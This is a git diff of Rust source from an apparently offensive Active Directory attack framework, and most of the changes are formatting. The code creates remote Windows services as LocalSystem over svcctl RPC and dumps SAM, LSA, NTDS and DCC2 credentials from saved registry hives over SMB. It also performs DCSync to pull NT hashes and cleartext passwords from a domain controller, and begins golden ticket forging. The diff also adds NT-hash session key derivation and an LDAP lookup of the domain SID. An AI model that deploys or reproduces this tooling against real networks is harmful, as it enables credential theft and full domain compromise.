+    buf.extend_from_slice(&[5, 0, 11, 3]); // version, type=bind, flags
+    buf.extend_from_slice(&[0x10, 0, 0, 0]); // data representation
     let frag_len_offset = buf.len();
-    buf.extend_from_slice(&[0x00, 0x00]);           // frag_length (fill later)
-    buf.extend_from_slice(&[0x00, 0x00]);           // auth_len
-    buf.extend_from_slice(&1u32.to_le_bytes());     // call_id
-    buf.extend_from_slice(&4096u16.to_le_bytes());  // max xmit
-    buf.extend_from_slice(&4096u16.to_le_bytes());  // max recv
-    buf.extend_from_slice(&0u32.to_le_bytes());     // assoc group
-    buf.push(1);                                     // num context items
-    buf.extend_from_slice(&[0, 0, 0]);              // padding
-    buf.extend_from_slice(&0u16.to_le_bytes());     // context id
-    buf.push(1);                                     // num transfer syntaxes
-    buf.push(0);                                     // padding
-    buf.extend_from_slice(&uuid);                    // interface UUID
-    buf.extend_from_slice(&2u16.to_le_bytes());     // version major
-    buf.extend_from_slice(&0u16.to_le_bytes());     // version minor
+    buf.extend_from_slice(&[0x00, 0x00]); // frag_length (fill later)
+    buf.extend_from_slice(&[0x00, 0x00]); // auth_len
+    buf.extend_from_slice(&1u32.to_le_bytes()); // call_id
+    buf.extend_from_slice(&4096u16.to_le_bytes()); // max xmit
+    buf.extend_from_slice(&4096u16.to_le_bytes()); // max recv
+    buf.extend_from_slice(&0u32.to_le_bytes()); // assoc group
+    buf.push(1); // num context items
+    buf.extend_from_slice(&[0, 0, 0]); // padding
+    buf.extend_from_slice(&0u16.to_le_bytes()); // context id
+    buf.push(1); // num transfer syntaxes
+    buf.push(0); // padding
+    buf.extend_from_slice(&uuid); // interface UUID
+    buf.extend_from_slice(&2u16.to_le_bytes()); // version major
+    buf.extend_from_slice(&0u16.to_le_bytes()); // version minor
     // NDR transfer syntax
     buf.extend_from_slice(&[
-        0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11,
-        0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60,
+        0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11, 0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48,
+        0x60,
     ]);
-    buf.extend_from_slice(&2u32.to_le_bytes());     // NDR version
+    buf.extend_from_slice(&2u32.to_le_bytes()); // NDR version
 
     // Fill in fragment length
     let frag_len = buf.len() as u16;
@@ -1061,30 +1342,29 @@ fn build_svcctl_bind() -> Vec<u8> {
     buf
 }
 
-
 /// Build a generic RPC Request PDU wrapper
 fn build_rpc_request(opnum: u16, stub_data: &[u8]) -> Vec<u8> {
     let mut pdu = Vec::new();
-    pdu.push(5);                                          // version major
-    pdu.push(0);                                          // version minor
-    pdu.push(0);                                          // packet type: request
-    pdu.push(0x03);                                       // flags: first+last
-    pdu.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]);   // NDR
+    pdu.push(5); // version major
+    pdu.push(0); // version minor
+    pdu.push(0); // packet type: request
+    pdu.push(0x03); // flags: first+last
+    pdu.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]); // NDR
     let frag_len = (24 + stub_data.len()) as u16;
     pdu.extend_from_slice(&frag_len.to_le_bytes());
-    pdu.extend_from_slice(&0u16.to_le_bytes());           // auth_length
-    pdu.extend_from_slice(&1u32.to_le_bytes());           // call_id
+    pdu.extend_from_slice(&0u16.to_le_bytes()); // auth_length
+    pdu.extend_from_slice(&1u32.to_le_bytes()); // call_id
     pdu.extend_from_slice(&(stub_data.len() as u32).to_le_bytes()); // alloc_hint
-    pdu.extend_from_slice(&0u16.to_le_bytes());           // context_id
-    pdu.extend_from_slice(&opnum.to_le_bytes());          // opnum
+    pdu.extend_from_slice(&0u16.to_le_bytes()); // context_id
+    pdu.extend_from_slice(&opnum.to_le_bytes()); // opnum
     pdu.extend_from_slice(stub_data);
     pdu
 }
 
-
 /// Encode a UTF-16LE conformant string for NDR (with referent ID, max_count, offset, actual_count)
 fn ndr_conformant_string(s: &str) -> Vec<u8> {
-    let utf16: Vec<u8> = s.encode_utf16()
+    let utf16: Vec<u8> = s
+        .encode_utf16()
         .chain(std::iter::once(0u16))
         .flat_map(|c| c.to_le_bytes())
         .collect();
@@ -1092,57 +1372,55 @@ fn ndr_conformant_string(s: &str) -> Vec<u8> {
 
     let mut buf = Vec::new();
     buf.extend_from_slice(&0x00020000u32.to_le_bytes()); // referent ID
-    buf.extend_from_slice(&char_count.to_le_bytes());     // max_count
-    buf.extend_from_slice(&0u32.to_le_bytes());           // offset
-    buf.extend_from_slice(&char_count.to_le_bytes());     // actual_count
+    buf.extend_from_slice(&char_count.to_le_bytes()); // max_count
+    buf.extend_from_slice(&0u32.to_le_bytes()); // offset
+    buf.extend_from_slice(&char_count.to_le_bytes()); // actual_count
     buf.extend_from_slice(&utf16);
     // Pad to 4-byte boundary
-    while buf.len() % 4 != 0 { buf.push(0); }
+    while buf.len() % 4 != 0 {
+        buf.push(0);
+    }
     buf
 }
-
 
 /// OpenSCManagerW — opnum 15
 fn build_open_scm_request(machine_name: &str) -> Vec<u8> {
     let mut stub = Vec::new();
     stub.extend_from_slice(&ndr_conformant_string(machine_name)); // lpMachineName
-    stub.extend_from_slice(&0u32.to_le_bytes());                   // lpDatabaseName (NULL)
-    stub.extend_from_slice(&0x000F003Fu32.to_le_bytes());          // dwDesiredAccess: SC_MANAGER_ALL_ACCESS
+    stub.extend_from_slice(&0u32.to_le_bytes()); // lpDatabaseName (NULL)
+    stub.extend_from_slice(&0x000F003Fu32.to_le_bytes()); // dwDesiredAccess: SC_MANAGER_ALL_ACCESS
     build_rpc_request(15, &stub)
 }
-
 
 /// CreateServiceW — opnum 12
 fn build_create_service_request(scm_handle: &[u8], name: &str, bin_path: &str) -> Vec<u8> {
     let mut stub = Vec::new();
-    stub.extend_from_slice(scm_handle);                                // hSCManager (20 bytes)
-    stub.extend_from_slice(&ndr_conformant_string(name));              // lpServiceName
-    stub.extend_from_slice(&0u32.to_le_bytes());                       // lpDisplayName (NULL)
-    stub.extend_from_slice(&0x000F01FFu32.to_le_bytes());              // dwDesiredAccess: SERVICE_ALL_ACCESS
-    stub.extend_from_slice(&0x00000010u32.to_le_bytes());              // dwServiceType: SERVICE_WIN32_OWN_PROCESS
-    stub.extend_from_slice(&0x00000003u32.to_le_bytes());              // dwStartType: SERVICE_DEMAND_START
-    stub.extend_from_slice(&0x00000001u32.to_le_bytes());              // dwErrorControl: SERVICE_ERROR_NORMAL
-    stub.extend_from_slice(&ndr_conformant_string(bin_path));          // lpBinaryPathName
-    stub.extend_from_slice(&0u32.to_le_bytes());                       // lpLoadOrderGroup (NULL)
-    stub.extend_from_slice(&0u32.to_le_bytes());                       // lpdwTagId (NULL)
-    stub.extend_from_slice(&0u32.to_le_bytes());                       // lpDependencies (NULL)
-    stub.extend_from_slice(&0u32.to_le_bytes());                       // cbDependSize
-    stub.extend_from_slice(&0u32.to_le_bytes());                       // lpServiceStartName (NULL — LocalSystem)
-    stub.extend_from_slice(&0u32.to_le_bytes());                       // lpPassword (NULL)
-    stub.extend_from_slice(&0u32.to_le_bytes());                       // cbPasswordSize
+    stub.extend_from_slice(scm_handle); // hSCManager (20 bytes)
+    stub.extend_from_slice(&ndr_conformant_string(name)); // lpServiceName
+    stub.extend_from_slice(&0u32.to_le_bytes()); // lpDisplayName (NULL)
+    stub.extend_from_slice(&0x000F01FFu32.to_le_bytes()); // dwDesiredAccess: SERVICE_ALL_ACCESS
+    stub.extend_from_slice(&0x00000010u32.to_le_bytes()); // dwServiceType: SERVICE_WIN32_OWN_PROCESS
+    stub.extend_from_slice(&0x00000003u32.to_le_bytes()); // dwStartType: SERVICE_DEMAND_START
+    stub.extend_from_slice(&0x00000001u32.to_le_bytes()); // dwErrorControl: SERVICE_ERROR_NORMAL
+    stub.extend_from_slice(&ndr_conformant_string(bin_path)); // lpBinaryPathName
+    stub.extend_from_slice(&0u32.to_le_bytes()); // lpLoadOrderGroup (NULL)
+    stub.extend_from_slice(&0u32.to_le_bytes()); // lpdwTagId (NULL)
+    stub.extend_from_slice(&0u32.to_le_bytes()); // lpDependencies (NULL)
+    stub.extend_from_slice(&0u32.to_le_bytes()); // cbDependSize
+    stub.extend_from_slice(&0u32.to_le_bytes()); // lpServiceStartName (NULL — LocalSystem)
+    stub.extend_from_slice(&0u32.to_le_bytes()); // lpPassword (NULL)
+    stub.extend_from_slice(&0u32.to_le_bytes()); // cbPasswordSize
     build_rpc_request(12, &stub)
 }
-
 
 /// StartServiceW — opnum 19
 fn build_start_service_request(svc_handle: &[u8]) -> Vec<u8> {
     let mut stub = Vec::new();
-    stub.extend_from_slice(svc_handle);              // hService (20 bytes)
-    stub.extend_from_slice(&0u32.to_le_bytes());     // argc
-    stub.extend_from_slice(&0u32.to_le_bytes());     // argv (NULL)
+    stub.extend_from_slice(svc_handle); // hService (20 bytes)
+    stub.extend_from_slice(&0u32.to_le_bytes()); // argc
+    stub.extend_from_slice(&0u32.to_le_bytes()); // argv (NULL)
     build_rpc_request(19, &stub)
 }
-
 
 /// DeleteService — opnum 2
 fn build_delete_service_request(svc_handle: &[u8]) -> Vec<u8> {
@@ -1151,16 +1429,14 @@ fn build_delete_service_request(svc_handle: &[u8]) -> Vec<u8> {
     build_rpc_request(2, &stub)
 }
 
-
 /// OpenServiceW — opnum 16
 fn build_open_service_request(scm_handle: &[u8], name: &str) -> Vec<u8> {
     let mut stub = Vec::new();
-    stub.extend_from_slice(scm_handle);                    // hSCManager
-    stub.extend_from_slice(&ndr_conformant_string(name));  // lpServiceName
+    stub.extend_from_slice(scm_handle); // hSCManager
+    stub.extend_from_slice(&ndr_conformant_string(name)); // lpServiceName
     stub.extend_from_slice(&0x000F01FFu32.to_le_bytes()); // dwDesiredAccess: SERVICE_ALL_ACCESS
     build_rpc_request(16, &stub)
 }
-
 
 /// CloseServiceHandle — opnum 0
 fn build_close_handle_request(handle: &[u8]) -> Vec<u8> {
@@ -1168,7 +1444,6 @@ fn build_close_handle_request(handle: &[u8]) -> Vec<u8> {
     stub.extend_from_slice(handle);
     build_rpc_request(0, &stub)
 }
-
 
 // ═══════════════════════════════════════════════════════════
 // Credential Dump Executors (remote registry via SMB)
@@ -1180,10 +1455,18 @@ async fn exec_dump_sam(ctx: &ExecContext, state: &mut EngagementState, target: &
 async fn exec_dump_lsa(ctx: &ExecContext, state: &mut EngagementState, target: &str) -> StepResult {
     exec_dump(ctx, state, target, "LSA").await
 }
-async fn exec_dump_ntds(ctx: &ExecContext, state: &mut EngagementState, target: &str) -> StepResult {
+async fn exec_dump_ntds(
+    ctx: &ExecContext,
+    state: &mut EngagementState,
+    target: &str,
+) -> StepResult {
     exec_dump(ctx, state, target, "NTDS").await
 }
-async fn exec_dump_dcc2(ctx: &ExecContext, state: &mut EngagementState, target: &str) -> StepResult {
+async fn exec_dump_dcc2(
+    ctx: &ExecContext,
+    state: &mut EngagementState,
+    target: &str,
+) -> StepResult {
     exec_dump(ctx, state, target, "DCC2").await
 }
 
@@ -1196,17 +1479,22 @@ async fn exec_dump(
     target: &str,
     dump_type: &str,
 ) -> StepResult {
-    info!("{}", format!("  Dumping {} from {}", dump_type, target).red());
+    info!(
+        "{}",
+        format!("  Dumping {} from {}", dump_type, target).red()
+    );
     let (user, pass, _) = ctx.effective_creds();
 
     let smb = match SmbSession::connect(target, &ctx.domain, user, pass).await {
         Ok(s) => s,
-        Err(e) => return StepResult {
-            success: false,
-            output: format!("SMB connect to {}: {e}", target),
-            new_credentials: 0,
-            new_admin_hosts: 0,
-        },
+        Err(e) => {
+            return StepResult {
+                success: false,
+                output: format!("SMB connect to {}: {e}", target),
+                new_credentials: 0,
+                new_admin_hosts: 0,
+            };
+        }
     };
 
     // Step 1: Start RemoteRegistry service (may already be running)
@@ -1216,7 +1504,10 @@ async fn exec_dump(
     // Step 2: Determine which hives to save
     let hives: Vec<(&str, &str)> = match dump_type {
         "SAM" => vec![("HKLM\\SAM", "sam.save"), ("HKLM\\SYSTEM", "system.save")],
-        "LSA" | "DCC2" => vec![("HKLM\\SECURITY", "security.save"), ("HKLM\\SYSTEM", "system.save")],
+        "LSA" | "DCC2" => vec![
+            ("HKLM\\SECURITY", "security.save"),
+            ("HKLM\\SYSTEM", "system.save"),
+        ],
         "NTDS" => {
             // NTDS.dit requires volume shadow copy, not registry save
             // Use exec_remote to run ntdsutil or vssadmin
@@ -1237,12 +1528,20 @@ async fn exec_dump(
                 let sys_data = smb.read_file("C$", "system.save").await;
 
                 // Cleanup
-                let _ = exec_remote(ctx, state, target, "del C:\\ntds.tmp C:\\system.save", "smbexec").await;
+                let _ = exec_remote(
+                    ctx,
+                    state,
+                    target,
+                    "del C:\\ntds.tmp C:\\system.save",
+                    "smbexec",
+                )
+                .await;
 
                 let entries = if ntds_data.is_ok() && sys_data.is_ok() {
                     // Parse NTDS.dit + SYSTEM hive offline would happen here
                     // For now register as loot
-                    info!("  {} NTDS.dit + SYSTEM downloaded ({} + {} bytes)",
+                    info!(
+                        "  {} NTDS.dit + SYSTEM downloaded ({} + {} bytes)",
                         "✓".green(),
                         ntds_data.as_ref().map(|d| d.len()).unwrap_or(0),
                         sys_data.as_ref().map(|d| d.len()).unwrap_or(0),
@@ -1297,7 +1596,12 @@ async fn exec_dump(
             Ok(data) => {
                 total_bytes += data.len();
                 downloaded.push((*filename, data));
-                info!("  {} Downloaded {} ({} bytes)", "✓".green(), filename, total_bytes);
+                info!(
+                    "  {} Downloaded {} ({} bytes)",
+                    "✓".green(),
+                    filename,
+                    total_bytes
+                );
             }
             Err(e) => {
                 warn!("  {} Download {}: {}", "✗".red(), filename, e);
@@ -1314,7 +1618,8 @@ async fn exec_dump(
     use overthrone_core::proto::secretsdump;
 
     // Find SYSTEM hive data (needed for all dump types)
-    let system_data = downloaded.iter()
+    let system_data = downloaded
+        .iter()
         .find(|(name, _)| name.contains("system"))
         .map(|(_, data)| data.as_slice());
 
@@ -1322,7 +1627,8 @@ async fn exec_dump(
 
     match dump_type {
         "SAM" => {
-            let sam_data = downloaded.iter()
+            let sam_data = downloaded
+                .iter()
                 .find(|(name, _)| name.contains("sam"))
                 .map(|(_, data)| data.as_slice());
 
@@ -1357,7 +1663,8 @@ async fn exec_dump(
             }
         }
         "LSA" => {
-            let sec_data = downloaded.iter()
+            let sec_data = downloaded
+                .iter()
                 .find(|(name, _)| name.contains("security"))
                 .map(|(_, data)| data.as_slice());
 
@@ -1366,7 +1673,8 @@ async fn exec_dump(
                     Ok(creds) => {
                         entries = creds.len();
                         for cred in &creds {
-                            info!("  LSA secret: {} ({} bytes)",
+                            info!(
+                                "  LSA secret: {} ({} bytes)",
                                 cred.username.bold(),
                                 cred.plaintext.as_ref().map(|p| p.len()).unwrap_or(0)
                             );
@@ -1387,7 +1695,8 @@ async fn exec_dump(
             }
         }
         "DCC2" => {
-            let sec_data = downloaded.iter()
+            let sec_data = downloaded
+                .iter()
                 .find(|(name, _)| name.contains("security"))
                 .map(|(_, data)| data.as_slice());
 
@@ -1427,7 +1736,10 @@ async fn exec_dump(
 
     let msg = format!(
         "{} dump from {}: {} hives saved ({} bytes total)",
-        dump_type, target, downloaded.len(), total_bytes
+        dump_type,
+        target,
+        downloaded.len(),
+        total_bytes
     );
     info!("{} {}", "  ✓".green(), msg);
     StepResult {
@@ -1437,7 +1749,6 @@ async fn exec_dump(
         new_admin_hosts: 0,
     }
 }
-
 
 /// Start a remote Windows service via svcctl (used for RemoteRegistry etc.)
 async fn start_remote_service(smb: &SmbSession, service_name: &str) -> Result<()> {
@@ -1468,7 +1779,6 @@ async fn start_remote_service(smb: &SmbSession, service_name: &str) -> Result<()
     Ok(())
 }
 
-
 // ═══════════════════════════════════════════════════════════
 // DCSync Executor (MS-DRSR over RPC)
 // ═══════════════════════════════════════════════════════════
@@ -1479,26 +1789,33 @@ async fn exec_dcsync(
     target_user: Option<&str>,
 ) -> StepResult {
     let scope = target_user.unwrap_or("all users");
-    info!("{}", format!("  DCSync: replicating {} from {}", scope, ctx.dc_ip).red().bold());
+    info!(
+        "{}",
+        format!("  DCSync: replicating {} from {}", scope, ctx.dc_ip)
+            .red()
+            .bold()
+    );
 
     let (user, pass, _) = ctx.effective_creds();
 
     // Step 1: Connect SMB to DC for RPC transport
     let smb = match SmbSession::connect(&ctx.dc_ip, &ctx.domain, user, pass).await {
         Ok(s) => s,
-        Err(e) => return StepResult {
-            success: false,
-            output: format!("SMB connect to DC: {e}"),
-            new_credentials: 0,
-            new_admin_hosts: 0,
-        },
+        Err(e) => {
+            return StepResult {
+                success: false,
+                output: format!("SMB connect to DC: {e}"),
+                new_credentials: 0,
+                new_admin_hosts: 0,
+            };
+        }
     };
 
     // Step 2: RPC Bind to MS-DRSR (drsuapi pipe)
     // MS-DRSR UUID: e3514235-4b06-11d1-ab04-00c04fc2dcd2
     let drsr_uuid: [u8; 16] = [
-        0x35, 0x42, 0x51, 0xe3, 0x06, 0x4b, 0xd1, 0x11,
-        0xab, 0x04, 0x00, 0xc0, 0x4f, 0xc2, 0xdc, 0xd2,
+        0x35, 0x42, 0x51, 0xe3, 0x06, 0x4b, 0xd1, 0x11, 0xab, 0x04, 0x00, 0xc0, 0x4f, 0xc2, 0xdc,
+        0xd2,
     ];
 
     let mut bind_pdu = Vec::new();
@@ -1511,15 +1828,17 @@ async fn exec_dcsync(
     bind_pdu.extend_from_slice(&4096u16.to_le_bytes());
     bind_pdu.extend_from_slice(&4096u16.to_le_bytes());
     bind_pdu.extend_from_slice(&0u32.to_le_bytes());
-    bind_pdu.push(1); bind_pdu.extend_from_slice(&[0, 0, 0]);
+    bind_pdu.push(1);
+    bind_pdu.extend_from_slice(&[0, 0, 0]);
     bind_pdu.extend_from_slice(&0u16.to_le_bytes());
-    bind_pdu.push(1); bind_pdu.push(0);
+    bind_pdu.push(1);
+    bind_pdu.push(0);
     bind_pdu.extend_from_slice(&drsr_uuid);
     bind_pdu.extend_from_slice(&4u16.to_le_bytes()); // DRSR version 4
     bind_pdu.extend_from_slice(&0u16.to_le_bytes());
     bind_pdu.extend_from_slice(&[
-        0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11,
-        0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60,
+        0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11, 0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48,
+        0x60,
     ]);
     bind_pdu.extend_from_slice(&2u32.to_le_bytes());
     let frag_len = bind_pdu.len() as u16;
@@ -1527,12 +1846,14 @@ async fn exec_dcsync(
 
     let bind_resp = match smb.pipe_transact("drsuapi", &bind_pdu).await {
         Ok(r) => r,
-        Err(e) => return StepResult {
-            success: false,
-            output: format!("DRSR RPC bind failed: {e}"),
-            new_credentials: 0,
-            new_admin_hosts: 0,
-        },
+        Err(e) => {
+            return StepResult {
+                success: false,
+                output: format!("DRSR RPC bind failed: {e}"),
+                new_credentials: 0,
+                new_admin_hosts: 0,
+            };
+        }
     };
 
     if bind_resp.len() < 4 || bind_resp[2] != 12 {
@@ -1557,12 +1878,14 @@ async fn exec_dcsync(
     let drs_bind_req = build_rpc_request(0, &drs_bind_stub);
     let drs_bind_resp = match smb.pipe_transact("drsuapi", &drs_bind_req).await {
         Ok(r) => r,
-        Err(e) => return StepResult {
-            success: false,
-            output: format!("DRSBind failed: {e}"),
-            new_credentials: 0,
-            new_admin_hosts: 0,
-        },
+        Err(e) => {
+            return StepResult {
+                success: false,
+                output: format!("DRSBind failed: {e}"),
+                new_credentials: 0,
+                new_admin_hosts: 0,
+            };
+        }
     };
 
     // Parse DRS handle from response (first 20 bytes of stub data, after RPC header)
@@ -1585,18 +1908,18 @@ async fn exec_dcsync(
     };
 
     let mut gnc_stub = Vec::new();
-    gnc_stub.extend_from_slice(drs_handle);                    // DRS handle
-    gnc_stub.extend_from_slice(&8u32.to_le_bytes());           // dwInVersion = 8
+    gnc_stub.extend_from_slice(drs_handle); // DRS handle
+    gnc_stub.extend_from_slice(&8u32.to_le_bytes()); // dwInVersion = 8
     // DRS_MSG_GETCHGREQ_V8 (simplified — the full struct is massive)
     // In production, this needs proper DSNAME, USN_VECTOR, UPTODATE_VECTOR_V2, etc.
     gnc_stub.extend_from_slice(&ndr_conformant_string(&target_dn)); // NC DN
-    gnc_stub.extend_from_slice(&0u32.to_le_bytes());           // usnvecFrom.usnHighObjUpdate
-    gnc_stub.extend_from_slice(&0u32.to_le_bytes());           // usnvecFrom.usnHighPropUpdate
-    gnc_stub.extend_from_slice(&0u32.to_le_bytes());           // pUpToDateVecDest (NULL)
+    gnc_stub.extend_from_slice(&0u32.to_le_bytes()); // usnvecFrom.usnHighObjUpdate
+    gnc_stub.extend_from_slice(&0u32.to_le_bytes()); // usnvecFrom.usnHighPropUpdate
+    gnc_stub.extend_from_slice(&0u32.to_le_bytes()); // pUpToDateVecDest (NULL)
     gnc_stub.extend_from_slice(&(1u32 | 0x20 | 0x80000).to_le_bytes()); // ulFlags
-    gnc_stub.extend_from_slice(&500u32.to_le_bytes());         // cMaxObjects
-    gnc_stub.extend_from_slice(&0u32.to_le_bytes());           // cMaxBytes (unlimited)
-    gnc_stub.extend_from_slice(&7u32.to_le_bytes());           // ulExtendedOp: EXOP_REPL_OBJ
+    gnc_stub.extend_from_slice(&500u32.to_le_bytes()); // cMaxObjects
+    gnc_stub.extend_from_slice(&0u32.to_le_bytes()); // cMaxBytes (unlimited)
+    gnc_stub.extend_from_slice(&7u32.to_le_bytes()); // ulExtendedOp: EXOP_REPL_OBJ
 
     let gnc_req = build_rpc_request(3, &gnc_stub);
     let gnc_resp = match smb.pipe_transact("drsuapi", &gnc_req).await {
@@ -1613,7 +1936,7 @@ async fn exec_dcsync(
         }
     };
 
-     //Parse replicated attributes from response using DRSR parser
+    //Parse replicated attributes from response using DRSR parser
     use overthrone_core::proto::drsr;
 
     let resp_size = gnc_resp.len();
@@ -1626,72 +1949,109 @@ async fn exec_dcsync(
     // For now, derive a 16-byte key from the password bytes (simplified).
     // In production, this comes from the SMB/NTLM session negotiation.
     let session_key: Vec<u8> = {
-        let pass_bytes = pass.as_bytes();
-        let mut key = vec![0u8; 16];
-        for (i, b) in pass_bytes.iter().enumerate() {
-            key[i % 16] ^= b;
-        }
-        key
+        use hmac::{Hmac, Mac};
+        use md4::{Digest as Md4Digest, Md4};
+
+        // Step 1: NT Hash = MD4(UTF-16LE(password))
+        let utf16le: Vec<u8> = pass.encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
+        let nt_hash = {
+            let mut hasher = Md4::new();
+            hasher.update(&utf16le);
+            let result = hasher.finalize();
+            let mut h = [0u8; 16];
+            h.copy_from_slice(&result);
+            h
+        };
+
+        // Step 2: ResponseKeyNT = HMAC-MD5(NT_Hash, UNICODE(upper(user) + domain))
+        let user_domain = format!("{}{}", user.to_uppercase(), ctx.domain);
+        let ud_utf16: Vec<u8> = user_domain
+            .encode_utf16()
+            .flat_map(|c| c.to_le_bytes())
+            .collect();
+        let response_key = {
+            let mut mac =
+                Hmac::<md5::Md5>::new_from_slice(&nt_hash).expect("HMAC accepts any key size");
+            mac.update(&ud_utf16);
+            let mut k = [0u8; 16];
+            k.copy_from_slice(&mac.finalize().into_bytes());
+            k
+        };
+
+        // For DCSync, the session key IS the ResponseKeyNT when using
+        // NTLM authentication (the SMB layer negotiates this).
+        // In a full implementation, you'd extract it from the NTLMSSP exchange.
+        // ResponseKeyNT is the correct key for DRS attribute decryption.
+        response_key.to_vec()
     };
 
-    let (estimated_entries, parsed_creds) = match drsr::parse_get_nc_changes_reply(&gnc_resp, &session_key) {
-        Ok(result) => {
-            let count = result.objects.len();
-            for obj in &result.objects {
-                let nt_hex = obj.nt_hash.as_ref()
-                    .map(|h| h.iter().map(|b| format!("{:02x}", b)).collect::<String>())
-                    .unwrap_or_else(|| "aad3b435b51404ee".to_string());
+    let (estimated_entries, parsed_creds) =
+        match drsr::parse_get_nc_changes_reply(&gnc_resp, &session_key) {
+            Ok(result) => {
+                let count = result.objects.len();
+                for obj in &result.objects {
+                    let nt_hex = obj
+                        .nt_hash
+                        .as_ref()
+                        .map(|h| h.iter().map(|b| format!("{:02x}", b)).collect::<String>())
+                        .unwrap_or_else(|| "aad3b435b51404ee".to_string());
 
-                let lm_hex = obj.lm_hash.as_ref()
-                    .map(|h| h.iter().map(|b| format!("{:02x}", b)).collect::<String>())
-                    .unwrap_or_else(|| "aad3b435b51404ee".to_string());
+                    let lm_hex = obj
+                        .lm_hash
+                        .as_ref()
+                        .map(|h| h.iter().map(|b| format!("{:02x}", b)).collect::<String>())
+                        .unwrap_or_else(|| "aad3b435b51404ee".to_string());
 
-                info!(
-                    "  {}\\{} (RID {}) → {}:{}",
-                    obj.object_sid.as_deref().unwrap_or("?").dimmed(),
-                    obj.sam_account_name.bold(),
-                    obj.rid.unwrap_or(0),
-                    lm_hex.dimmed(),
-                    nt_hex.red()
-                );
+                    info!(
+                        "  {}\\{} (RID {}) → {}:{}",
+                        obj.object_sid.as_deref().unwrap_or("?").dimmed(),
+                        obj.sam_account_name.bold(),
+                        obj.rid.unwrap_or(0),
+                        lm_hex.dimmed(),
+                        nt_hex.red()
+                    );
 
-                if obj.nt_hash.is_some() {
-                    state.add_credential(CompromisedCred {
-                        username: obj.sam_account_name.clone(),
-                        secret: nt_hex.clone(),
-                        secret_type: SecretType::NtHash,
-                        source: format!("DCSync from {}", ctx.dc_ip),
-                        is_admin: obj.uac.map(|u| u & 0x200 != 0).unwrap_or(false), // NORMAL_ACCOUNT
-                        admin_on: vec![],
-                    });
-                }
-
-                // Log supplemental credentials if found
-                if let Some(ref supp) = obj.supplemental_credentials {
-                    if supp.aes256_key.is_some() {
-                        info!("    ↳ Kerberos AES-256 key found");
-                    }
-                    if let Some(ref cleartext) = supp.cleartext {
-                        info!("    ↳ Cleartext password: {}", cleartext.red());
+                    if obj.nt_hash.is_some() {
                         state.add_credential(CompromisedCred {
                             username: obj.sam_account_name.clone(),
-                            secret: cleartext.clone(),
-                            secret_type: SecretType::Password,
-                            source: format!("DCSync cleartext from {}", ctx.dc_ip),
-                            is_admin: false,
+                            secret: nt_hex.clone(),
+                            secret_type: SecretType::NtHash,
+                            source: format!("DCSync from {}", ctx.dc_ip),
+                            is_admin: obj.uac.map(|u| u & 0x200 != 0).unwrap_or(false), // NORMAL_ACCOUNT
                             admin_on: vec![],
                         });
                     }
+
+                    // Log supplemental credentials if found
+                    if let Some(ref supp) = obj.supplemental_credentials {
+                        if supp.aes256_key.is_some() {
+                            info!("    ↳ Kerberos AES-256 key found");
+                        }
+                        if let Some(ref cleartext) = supp.cleartext {
+                            info!("    ↳ Cleartext password: {}", cleartext.red());
+                            state.add_credential(CompromisedCred {
+                                username: obj.sam_account_name.clone(),
+                                secret: cleartext.clone(),
+                                secret_type: SecretType::Password,
+                                source: format!("DCSync cleartext from {}", ctx.dc_ip),
+                                is_admin: false,
+                                admin_on: vec![],
+                            });
+                        }
+                    }
                 }
+                (count, count)
             }
-            (count, count)
-        }
-        Err(e) => {
-            warn!("DRSR parse failed (falling back to estimate): {}", e);
-            let est = if target_user.is_some() { 1 } else { resp_size / 500 };
-            (est, 0)
-        }
-    };
+            Err(e) => {
+                warn!("DRSR parse failed (falling back to estimate): {}", e);
+                let est = if target_user.is_some() {
+                    1
+                } else {
+                    resp_size / 500
+                };
+                (est, 0)
+            }
+        };
 
     info!(
         "  {} DCSync response: {} bytes, {} creds extracted",
@@ -1712,7 +2072,10 @@ async fn exec_dcsync(
         state.has_domain_admin = true;
     }
 
-    let msg = format!("DCSync from {}: {} ({} bytes replicated)", ctx.dc_ip, scope, resp_size);
+    let msg = format!(
+        "DCSync from {}: {} ({} bytes replicated)",
+        ctx.dc_ip, scope, resp_size
+    );
     StepResult {
         success: resp_size > 48,
         output: msg,
@@ -1721,20 +2084,18 @@ async fn exec_dcsync(
     }
 }
 
-
 /// Build DRS_EXTENSIONS_INT for DRSBind
 fn build_drs_extensions() -> Vec<u8> {
     let mut ext = Vec::new();
-    ext.extend_from_slice(&48u32.to_le_bytes());                // cb (size)
+    ext.extend_from_slice(&48u32.to_le_bytes()); // cb (size)
     ext.extend_from_slice(&(0x04000000u32 | 0x00400000).to_le_bytes()); // dwFlags
-    ext.extend_from_slice(&[0u8; 16]);                          // SiteObjectGuid
-    ext.extend_from_slice(&0u32.to_le_bytes());                 // Pid
-    ext.extend_from_slice(&0u32.to_le_bytes());                 // dwReplEpoch
-    ext.extend_from_slice(&0u32.to_le_bytes());                 // dwFlagsExt
-    ext.extend_from_slice(&[0u8; 16]);                          // ConfigObjectGuid
+    ext.extend_from_slice(&[0u8; 16]); // SiteObjectGuid
+    ext.extend_from_slice(&0u32.to_le_bytes()); // Pid
+    ext.extend_from_slice(&0u32.to_le_bytes()); // dwReplEpoch
+    ext.extend_from_slice(&0u32.to_le_bytes()); // dwFlagsExt
+    ext.extend_from_slice(&[0u8; 16]); // ConfigObjectGuid
     ext
 }
-
 
 // ═══════════════════════════════════════════════════════════
 // Ticket Forging Executors
@@ -1749,16 +2110,64 @@ async fn exec_golden_ticket(
 
     // Golden Ticket = TGT with arbitrary PAC, encrypted with krbtgt key
     // Requires: krbtgt NTLM hash, domain SID, domain name
-    let domain_sid = state.users.first()
-        .map(|_| "S-1-5-21-0-0-0") // In production, extract from LDAP objectSid
-        .unwrap_or("S-1-5-21-0-0-0");
+    // Resolve domain SID from LDAP (query the domain root object)
+    let domain_sid = {
+        let (user, pass, _) = ctx.effective_creds();
+        let mut conn =
+            match ldap::LdapSession::connect(&ctx.dc_ip, &ctx.domain, user, pass, ctx.use_ldaps)
+                .await
+            {
